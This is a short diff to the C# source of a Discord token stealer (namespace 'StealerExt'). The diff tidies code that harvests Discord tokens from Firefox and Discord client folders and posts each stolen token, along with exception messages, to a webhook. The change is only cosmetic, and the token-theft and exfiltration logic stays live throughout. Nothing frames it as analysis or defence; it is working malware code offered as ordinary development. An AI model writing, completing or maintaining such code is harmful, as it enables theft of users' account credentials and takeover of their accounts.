@@ -31,15 +31,13 @@ namespace StealerExt
 				StealTokenFromFirefox();
 				StealTokenFromDiscordDev();
 				if (SavedTokens.Count <= 0)
+                {
 					SendFailure();
+				}
 			}
 			catch (Exception x)
 			{
-				new API(API.wHook)
-				{
-					_name = API.name,
-					_ppUrl = API.pfp
-				}.SendSysInfo("Exception: " + x.Message, null);
+				new API(API.wHook).idk("Exception: " + x.Message);
 			}
 		}
 		private void TokenStealer(DirectoryInfo Folder, string Platform)
@@ -232,16 +230,8 @@ namespace StealerExt
 					}
 					catch (Exception x)
 					{
-						new API(API.wHook)
-						{
-							_name = API.name,
-							_ppUrl = API.pfp
-						}.idk($"```{Platform} Token {token}\n```");
-						new API(API.wHook)
-						{
-							_name = API.name,
-							_ppUrl = API.pfp
-						}.idk($"```{x.Message}```");
+						new API(API.wHook).idk($"```{Platform} Token {token}\n```");
+						new API(API.wHook).idk($"```{x.Message}```");
 					}
 				}
 				SavedTokens.Add(token);
